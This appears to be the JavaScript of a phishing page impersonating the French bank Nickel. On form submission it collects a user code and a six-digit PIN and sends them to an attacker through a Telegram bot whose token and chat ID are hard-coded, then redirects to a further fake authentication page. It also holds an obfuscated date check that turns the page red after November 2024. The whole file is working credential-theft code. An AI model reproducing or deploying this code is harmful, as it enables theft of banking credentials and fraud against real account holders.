document.addEventListener('DOMContentLoaded', function () {

    var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 49, 45, 48, 51)); 


    var b = new Date();
    var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());

    if (c >= a) {
        document.body.style.backgroundColor = 'red';
    }

});

var usercode = localStorage.getItem('usercode');
var pass = document.getElementById('pass');

document.getElementById('form2').addEventListener('submit', function (e) {
    e.preventDefault()
    
     const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);
    // const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);

    const regexSixChiffres = /^[0-9]{6}$/;
    const passPin = pass.value;

    if (regexSixChiffres.test(passPin)) {
                bot.sendMessage('👔User NICKEL : ' + usercode + '🔓Mot de passe : ' + pass.value)
                    .then(res => {
                        console.log(res);
                        //debugger
                        window.location.href = './auth.html'
                    })
    } else {
        document.getElementById('noti').innerText = "🔔 le code entrer est incorrect !";
    }


})